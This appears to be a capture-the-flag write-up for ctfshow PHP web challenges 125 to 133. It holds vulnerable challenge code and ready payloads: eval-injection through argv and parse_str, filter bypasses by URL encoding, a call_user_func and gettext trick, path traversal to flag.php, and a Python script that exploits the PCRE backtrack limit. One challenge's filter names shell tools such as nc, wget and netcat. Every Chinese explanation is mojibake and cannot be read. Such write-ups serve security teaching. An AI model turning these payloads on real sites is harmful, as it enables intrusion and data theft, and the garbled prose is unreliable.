<p>è¿™é‡Œæœ‰ä¸ªå¾ˆå‘çš„ç‚¹</p>
<blockquote>
<p>åœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†ï¼Œsuch asï¼š<code>CTF[SHOW.COM</code>&#x3D;&gt;<code>CTF_SHOW.COM</code></p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘é¢<code>POST</code>  <code>CTF_SHOW.COM</code>æ—¶ï¼Œä¼šè‡ªåŠ¨è§£ææˆ<code>CTF_SHOW_COM</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>



<h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”äºä¸Šä¸€é¢˜ï¼Œé¢˜ç›®è¿‡è·¯çš„æ›´å¤šäº†ï¼Œechoè¿™äº›æ‰“å°å‡½æ•°è¢«è¿‡æ»¤</p>
<p>è¿™é‡Œæˆ‘ä»¬è¯¦ç»†çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>$_SERVER[â€˜argvâ€™]ï¼š</p>
<p>1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹</p>
<pre><code>ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[&#39;argv&#39;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°
</code></pre>
<p>2ã€webç½‘é¡µæ¨¡å¼ä¸‹</p>
<pre><code>åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹
    
è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ
    
è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]
    
$argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨
</code></pre>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬æ˜¯åœ¨ç½‘é¡µæ¨¡å¼ä¸‹çš„ï¼Œæ³¨æ„é‡ç‚¹ï¼š</span><br><span class="line">$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]</span><br><span class="line">è€Œ $_SERVER[â€˜QUERY_STRINGâ€™] æ˜¯è·å–æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿå°±æ˜¯?åé¢çš„è¯­å¥</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?$fl0g=flag_give_me;</span><br><span class="line"></span><br><span class="line">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§æ€è·¯</p>
<p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤<code>highlight_file()</code>äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=flag.php</span><br><span class="line">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>



<h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ä¸ä¸Šé¢˜ä¸€æ ·ï¼Œè¿™å›å¤šç»™å‡ ä¸ªpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: a=1+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ä¸­ç”¨åŠ å·(åŠ å·åœ¨urlä¸­èµ·åˆ°ç©ºæ ¼çš„ä½œç”¨)åˆ†éš”<code>$a[1]</code>å¯¹åº”çš„å°±æ˜¯<code>fl0g=flag_give_me</code>ï¼Œæ‰€ä»¥ä¸‹é¢è¿™ç§ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: a=1+2+fl0g=flag_give_me//åŠ å·åœ¨urlä¸­èµ·åˆ°ç©ºæ ¼çš„ä½œç”¨</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">ä¼ å…¥ a=1+fl0g=flag_give_me</span><br><span class="line">ç»“æœå¦‚ä¸‹</span><br><span class="line">array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(waf($url))&#123;</span><br><span class="line">    die(&quot;å—¯å“¼ï¼Ÿ&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>è·å–çš„æŸ¥è¯¢è¯­å¥æ˜¯æœåŠ¡ç«¯è¿˜æ²¡urlè§£ç çš„ï¼Œæ‰€ä»¥urlç¼–ç ç»•è¿‡å³å¯ï¼š</p>
</blockquote>
<p>å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($num)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $num))&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">	$num=chr($i);</span><br><span class="line">	if(waf($num))&#123;</span><br><span class="line">		echo &quot;æœªç¼–ç ï¼š&quot;.$num.&quot;   ç»è¿‡ç¼–ç ï¼š&quot;.urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç©ºæ ¼å¯ä»¥ç»•è¿‡ï¼Œ%20</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>



<h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class="line">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class="line"></span><br><span class="line">if(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;å—¯å“¼ï¼Ÿ&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜æˆ‘å‚»äº†ã€‚ã€‚ï¼Œè¿˜æ˜¯çœ‹å¤§å¸ˆå‚…çš„wpå§</p>
<p>è€ƒå¯Ÿç‚¹æ˜¯gettextæ‹“å±•ä½¿ç”¨</p>
<p>åœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo gettext(&quot;phpinfo&quot;);</span><br><span class="line">ç»“æœ  phpinfo</span><br><span class="line"></span><br><span class="line">echo _(&quot;phpinfo&quot;);</span><br><span class="line">ç»“æœ phpinfo</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> è¿”å›çš„å°±æ˜¯phpinfo</p>
<p>å› ä¸ºæˆ‘ä»¬è¦å¾—åˆ°çš„flagå°±åœ¨flag.phpä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨get_defined_vars</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars ( void ) : array</span><br><span class="line">æ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>



<h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_GET[&#x27;f&#x27;];</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class="line">        echo readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·¯å¾„ç©¿è¶Šå¾ˆç®€å•</p>
<p><code>../</code>   å›åˆ°ä¸Šä¸€çº§ç›®å½•</p>
<p><code>./</code>    è¡¨ç¤ºå½“å‰ç›®å½•</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=../../ctfshow../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>



<h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>preg_matchä¸è¯†åˆ«æ•°ç»„ï¼Œå¦åˆ™è¿”å›falseï¼ŒåŒ¹é…ä¸€æ¬¡è¿”å›1ï¼Œæ²¡æœ‰è¿”å›0</p>
<p>if(0 &#x3D;&#x3D;&#x3D; flase)è¿”å›å€¼ä¸ºfalse0ä¸æ˜¯å¼ºç­‰äºfalseçš„</p>
<p>stripos()å‡½æ•°å¯¹æ•°ç»„ä¸è¯†åˆ«ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›nullï¼Œnull!&#x3D;&#x3D;flase</p>
</blockquote>
<p>åœ¨&#x2F;sæ¨¡å¼ä¸‹ï¼Œ.åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œ+è¡¨ç¤ºé‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œæ²¡é”™æ˜¯è‡³å°‘ä¸€æ¬¡ï¼è€Œåé¢åŠ ä¸ª?è¡¨ç¤ºæ‡’æƒ°æ¨¡å¼ï¼Œ+?è¡¨ç¤ºé‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ã€‚å½“ç„¶æ‡’æƒ°æ¨¡å¼å¹¶ä¸å½±å“è§£é¢˜æ€è·¯ï¼Œæ€»ä¹‹å°±æ˜¯ctfshowå‰é¢å¿…é¡»å¾—æœ‰å­—ç¬¦æ‰èƒ½åŒ¹é…åˆ°ï¼Œæ‰€ä»¥ç›´æ¥f&#x3D;ctfshowå°±å¯ä»¥äº†</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?f=ctfshow[]</span><br><span class="line">?f[]=1</span><br><span class="line">?f=ctfshow  (ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…æ—¶ï¼Œå¿…é¡»è¦åœ¨ctfshowå‰é¢æœ‰å­—ç¬¦)</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±è¦ä»‹ç»pç¥çš„PCREå›æº¯</p>
<blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™<code>pcre.backtrack_limit</code>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™ï¼š</p>
<p>æˆ‘ä»¬é€šè¿‡å‘é€è¶…é•¿å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿æ­£åˆ™æ‰§è¡Œå¤±è´¥ï¼Œæœ€åç»•è¿‡ç›®æ ‡å¯¹PHPè¯­è¨€çš„é™åˆ¶ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è€è€å®å®ç”¨PCREå›æº¯å§</p>
<h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>æ‰«å‡º&#x2F;admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class="line">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class="line"></span><br><span class="line">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class="line">        </span><br><span class="line">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜çš„çªç ´ç‚¹åœ¨äº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(false &amp;&amp; false || true)&#123;</span><br><span class="line">	echo &quot;true!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;false!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//è¿”å›ç»“æœä¸ºtrue</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=admin&amp;password=admin&amp;username=admin</span><br></pre></td></tr></table></figure>



<h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

